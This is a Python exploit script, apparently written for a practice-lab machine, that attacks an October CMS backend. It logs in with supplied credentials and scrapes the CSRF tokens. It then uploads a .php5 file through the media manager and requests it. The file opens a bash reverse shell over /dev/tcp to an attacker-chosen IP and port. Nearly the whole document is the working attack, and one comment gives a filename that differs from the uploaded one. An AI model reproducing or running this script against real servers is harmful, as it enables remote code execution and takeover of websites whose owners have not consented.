import sys
import requests
from bs4 import BeautifulSoup

proxies={'http':'http://127.0.0.1:8080'}

if len(sys.argv) < 4:
	print("(+) usage: %s  user:pass <your_ip> <your_port>" % sys.argv[0])
	sys.exit(-1)

yourip=sys.argv[2]
yourPORT=sys.argv[3]

try:
	user = sys.argv[1].split(":")[0]
	pswd = sys.argv[1].split(":")[1]
except:
	print("(-) username and password needs to be in format \" user:pass \"")
	sys.exit(-1)

s=requests.session()
r=s.get("http://10.10.10.16/backend/backend/auth/signin")

#extracting session_key and token from source
soup = BeautifulSoup(r.content, 'html.parser')
print("finding token")
token_src=soup.find('input',{'name':'_token'})['value']
print("_token is " + token_src)

print("finding _session_key")
session_key_src=soup.find('input',{'name':'_session_key'})['value']
print("_session_key is " + session_key_src)

data = {
	'postback':'1',
	'_session_key':session_key_src,
	'_token':token_src,
	'login':user,
	'password':pswd
}

r=s.post("http://10.10.10.16/backend/backend/auth/signin", data=data, proxies=proxies, allow_redirects=True)


headers={
	'Content-Type':'multipart/form-data; boundary=---------------------------374940292117383429399910907',
	'X-OCTOBER-FILEUPLOAD': 'MediaManager-manager'
}
data=   "\r\n-----------------------------374940292117383429399910907\r\nContent-Disposition: form-data; name=\"path\"\r\n\r\n/" \
	"\r\n-----------------------------374940292117383429399910907\r\nContent-Disposition: form-data; name=\"file_data\"; filename=\"mrce.php5\"\r\nContent-Type: application/x-php\r\n\r\n<?php exec(\"/bin/bash -c 'bash -i > /dev/tcp/"+yourip+"/"+yourPORT+" 0>&1'\");" \
	"\r\n-----------------------------374940292117383429399910907--\r\n"

r=s.post("http://10.10.10.16/backend/cms/media", headers=headers,data=data, proxies=proxies)

#http://10.10.10.16/storage/app/media/brce.php5
print("shell inc xd") 
r=s.post("http://10.10.10.16/storage/app/media/mrce.php5")
